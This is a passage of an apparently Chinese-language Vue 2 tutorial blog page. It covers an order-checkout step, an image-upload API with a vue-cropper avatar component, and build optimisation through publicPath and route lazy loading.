#D4D4D4">  </span><span style="color: #D7BA7D">.tipsbtn</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">width</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">121px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">background</span><span style="color: #D4D4D4">: </span><span style="color: #DCDCAA">linear-gradient</span><span style="color: #D4D4D4">(</span><span style="color: #B5CEA8">90deg</span><span style="color: #D4D4D4">, </span><span style="color: #CE9178">#f9211c</span><span style="color: #D4D4D4">, </span><span style="color: #CE9178">#ff6335</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">color</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">#fff</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">text-align</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">center</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">line-height</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">46px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">display</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">block</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">font-size</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">14px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"><span style="color: #808080">&lt;/</span><span style="color: #569CD6">style</span><span style="color: #808080">&gt;</span></span></code></pre></div></div></figure><h2 id="订单结算"><a class="markdownIt-Anchor" href="#订单结算"></a> 订单结算</h2><p>购物车携带参数：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202409020134925.png" alt="image-20240902013448659"></p><h2 id="文件上传unfinished"><a class="markdownIt-Anchor" href="#文件上传unfinished"></a> 文件上传 ——unfinished</h2><h3 id="图片上传"><a class="markdownIt-Anchor" href="#图片上传"></a> 图片上传</h3><blockquote><p>接口要求：POST <code>/upload/image</code></p><p>Header 参数：</p><ul><li>Access-Token (String) 示例：<code>1741f74aed758a688515f72572dc8e37</code></li><li>platform (String) 示例值：H5</li></ul><p>Body 参数：<code>multipart/form-data</code></p><ul><li>file 对象</li></ul></blockquote><p>上传图片通常涉及到裁剪操作，于是使用 vue-cropper 插件辅助完成。</p><h4 id="安装-vue-cropper"><a class="markdownIt-Anchor" href="#安装-vue-cropper"></a> 安装 vue-cropper</h4><figure class="shiki sh"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #DCDCAA">npm</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">install</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">vue-cropper</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">--save</span></span></code></pre></div></div></figure><h4 id="在组件中使用-vue-cropper"><a class="markdownIt-Anchor" href="#在组件中使用-vue-cropper"></a> 在组件中使用 <code>vue-cropper</code></h4><p>创建上传的组件，允许用户选择图片、裁剪图片并实时预览裁剪效果，然后上传裁剪后的图片。</p><figure class="shiki vue"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #808080">&lt;</span><span style="color: #569CD6">template</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"avatar-upload"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">vue-cropper</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #C586C0">v-if</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #9CDCFE">showCropper</span><span style="color: #D4D4D4">"</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">ref</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"cropper"</span></span><span class="line"><span style="color: #D4D4D4">      :</span><span style="color: #9CDCFE">img</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #9CDCFE">imageSrc</span><span style="color: #D4D4D4">"</span></span><span class="line"><span style="color: #D4D4D4">      :</span><span style="color: #9CDCFE">output-size</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #D4D4D4">{ </span><span style="color: #C8C8C8">width</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">200</span><span style="color: #D4D4D4">, </span><span style="color: #C8C8C8">height</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">200</span><span style="color: #D4D4D4"> }</span><span style="color: #D4D4D4">"</span></span><span class="line"><span style="color: #D4D4D4">      :</span><span style="color: #9CDCFE">output-type</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #CE9178">'jpeg'</span><span style="color: #D4D4D4">"</span></span><span class="line"><span style="color: #D4D4D4">      :</span><span style="color: #9CDCFE">can-move-box</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #569CD6">true</span><span style="color: #D4D4D4">"</span></span><span class="line"><span style="color: #D4D4D4">      :</span><span style="color: #9CDCFE">auto-crop</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #569CD6">true</span><span style="color: #D4D4D4">"</span></span><span class="line"><span style="color: #D4D4D4">      :</span><span style="color: #9CDCFE">fixed-box</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #569CD6">true</span><span style="color: #D4D4D4">"</span></span><span class="line"><span style="color: #D4D4D4">      :</span><span style="color: #9CDCFE">fixed</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #569CD6">true</span><span style="color: #D4D4D4">"</span></span><span class="line"><span style="color: #D4D4D4">      :</span><span style="color: #9CDCFE">center-box</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #569CD6">true</span><span style="color: #D4D4D4">"</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&gt;&lt;/</span><span style="color: #569CD6">vue-cropper</span><span style="color: #808080">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">v-else</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">img</span></span><span class="line"><span style="color: #D4D4D4">        :</span><span style="color: #9CDCFE">src</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #9CDCFE">avatarUrl</span><span style="color: #D4D4D4">"</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">alt</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"Avatar"</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #C586C0">v-if</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #9CDCFE">avatarUrl</span><span style="color: #D4D4D4">"</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"avatar-preview"</span></span><span class="line"><span style="color: #D4D4D4">      /</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">input</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">type</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"file"</span><span style="color: #D4D4D4"> @</span><span style="color: #9CDCFE">change</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #9CDCFE">onAvatarChange</span><span style="color: #D4D4D4">"</span><span style="color: #D4D4D4"> /</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">v-if</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #9CDCFE">showCropper</span><span style="color: #D4D4D4">"</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"cropper-controls"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">button</span><span style="color: #D4D4D4"> @</span><span style="color: #9CDCFE">click</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #9CDCFE">cropImage</span><span style="color: #D4D4D4">"</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">裁剪并上传</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">button</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">button</span><span style="color: #D4D4D4"> @</span><span style="color: #9CDCFE">click</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #9CDCFE">cancelCrop</span><span style="color: #D4D4D4">"</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">取消</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">button</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #808080">&lt;/</span><span style="color: #569CD6">template</span><span style="color: #808080">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #808080">&lt;</span><span style="color: #569CD6">script</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #C586C0">import</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">VueCropper</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">from</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"vue-cropper"</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #C586C0">import</span><span style="color: #D4D4D4"> { </span><span style="color: #9CDCFE">uploadImage</span><span style="color: #D4D4D4"> } </span><span style="color: #C586C0">from</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"@/api/upload"</span><span style="color: #D4D4D4">;</span></span><span class="line"></span><span class="line"><span style="color: #C586C0">export</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">default</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">components:</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">VueCropper</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">  },</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #DCDCAA">data</span><span style="color: #D4D4D4">() {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">avatarUrl:</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">""</span><span style="color: #D4D4D4">, </span><span style="color: #6A9955">// 存储裁剪后的头像URL</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">imageSrc:</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">""</span><span style="color: #D4D4D4">, </span><span style="color: #6A9955">// 存储用户选择的图片的URL</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">showCropper:</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">false</span><span style="color: #D4D4D4">, </span><span style="color: #6A9955">// 控制是否显示裁剪器</span></span><span class="line"><span style="color: #D4D4D4">    };</span></span><span class="line"><span style="color: #D4D4D4">  },</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">methods:</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #DCDCAA">onAvatarChange</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">event</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">file</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">event</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">target</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">files</span><span style="color: #D4D4D4">[</span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4">];</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #C586C0">if</span><span style="color: #D4D4D4"> (</span><span style="color: #9CDCFE">file</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">imageSrc</span><span style="color: #D4D4D4"> = </span><span style="color: #4FC1FF">URL</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">createObjectURL</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">file</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">showCropper</span><span style="color: #D4D4D4"> = </span><span style="color: #569CD6">true</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      }</span></span><span class="line"><span style="color: #D4D4D4">    },</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">async</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">cropImage</span><span style="color: #D4D4D4">() {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// 获取裁剪后的图片数据</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">$refs</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">cropper</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">getCropBlob</span><span style="color: #D4D4D4">(</span><span style="color: #569CD6">async</span><span style="color: #D4D4D4"> (</span><span style="color: #9CDCFE">blob</span><span style="color: #D4D4D4">) </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #6A9955">// 上传裁剪后的图片</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #C586C0">try</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">formData</span><span style="color: #D4D4D4"> = </span><span style="color: #569CD6">new</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">FormData</span><span style="color: #D4D4D4">();</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #9CDCFE">formData</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">append</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"file"</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">blob</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">response</span><span style="color: #D4D4D4"> = </span><span style="color: #C586C0">await</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">uploadImage</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">blob</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #C586C0">if</span><span style="color: #D4D4D4"> (</span><span style="color: #9CDCFE">response</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">status</span><span style="color: #D4D4D4"> === </span><span style="color: #B5CEA8">200</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">avatarUrl</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">response</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">data</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">fileInfo</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">preview_url</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">showCropper</span><span style="color: #D4D4D4"> = </span><span style="color: #569CD6">false</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">          } </span><span style="color: #C586C0">else</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">$toast</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">fail</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"上传失败，请重试"</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">          }</span></span><span class="line"><span style="color: #D4D4D4">        } </span><span style="color: #C586C0">catch</span><span style="color: #D4D4D4"> (</span><span style="color: #9CDCFE">error</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">$toast</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">fail</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"上传失败，请重试"</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #9CDCFE">console</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">error</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">error</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">        }</span></span><span class="line"><span style="color: #D4D4D4">      });</span></span><span class="line"><span style="color: #D4D4D4">    },</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #DCDCAA">cancelCrop</span><span style="color: #D4D4D4">() {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">showCropper</span><span style="color: #D4D4D4"> = </span><span style="color: #569CD6">false</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">imageSrc</span><span style="color: #D4D4D4"> = </span><span style="color: #CE9178">""</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    },</span></span><span class="line"><span style="color: #D4D4D4">  },</span></span><span class="line"><span style="color: #D4D4D4">};</span></span><span class="line"><span style="color: #808080">&lt;/</span><span style="color: #569CD6">script</span><span style="color: #808080">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #808080">&lt;</span><span style="color: #569CD6">style</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D7BA7D">.avatar-upload</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">display</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">flex</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">flex-direction</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">column</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">align-items</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">center</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"></span><span class="line"><span style="color: #D7BA7D">.avatar-preview</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">width</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">200px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">height</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">200px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">border-radius</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">50%</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">object-fit</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">cover</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">margin-bottom</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">10px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"></span><span class="line"><span style="color: #D7BA7D">.cropper-controls</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">margin-top</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">10px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">display</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">flex</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">gap</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">10px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"></span><span class="line"><span style="color: #D7BA7D">.cropper-controls</span><span style="color: #D4D4D4"> </span><span style="color: #D7BA7D">button</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">padding</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">5px</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">10px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">background-color</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">#ff3e47</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">color</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">white</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">border</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">none</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">border-radius</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">5px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">cursor</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">pointer</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"></span><span class="line"><span style="color: #D7BA7D">.cropper-controls</span><span style="color: #D4D4D4"> </span><span style="color: #D7BA7D">button:hover</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">background-color</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">#e0363d</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"><span style="color: #808080">&lt;/</span><span style="color: #569CD6">style</span><span style="color: #808080">&gt;</span></span></code></pre></div></div></figure><h2 id="打包优化"><a class="markdownIt-Anchor" href="#打包优化"></a> 打包优化</h2><h3 id="优化访问路径"><a class="markdownIt-Anchor" href="#优化访问路径"></a> 优化访问路径</h3><p>打包命令：<code>yarn build</code> 或者 <code>npm run build</code></p><p>打包如果没有配置 vue.config.js 的 <code>publicPath</code>，默认生成的匹配文件的写法是绝对路径，这意味着将来的可移植性降低。于是配置：</p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> { </span><span style="color: #4FC1FF">defineConfig</span><span style="color: #D4D4D4"> } = </span><span style="color: #DCDCAA">require</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"@vue/cli-service"</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #4EC9B0">module</span><span style="color: #D4D4D4">.</span><span style="color: #4EC9B0">exports</span><span style="color: #D4D4D4"> = </span><span style="color: #DCDCAA">defineConfig</span><span style="color: #D4D4D4">({</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">publicPath:</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"./"</span><span style="color: #D4D4D4">, </span><span style="color: #6A9955">// 默认为'/'</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">transpileDependencies:</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">true</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">});</span></span></code></pre></div></div></figure><h3 id="懒加载"><a class="markdownIt-Anchor" href="#懒加载"></a> 懒加载</h3><p>打包实际上将多个文件多合一，如果一次性加载所有的 js 文件是非常消耗性能的，因此推荐配置懒加载。</p><p><a href="https://router.vuejs.org/zh/guide/advanced/lazy-loading.html">路由懒加载</a></p><ul><li>异步组件改造 </li></ul><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">ProDetail</span><span style="color: #D4D4D4"> = () </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">import</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">'@/views/prodetail'</span><span style="color: #D4D4D4">)</span></span><span class="line"><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> 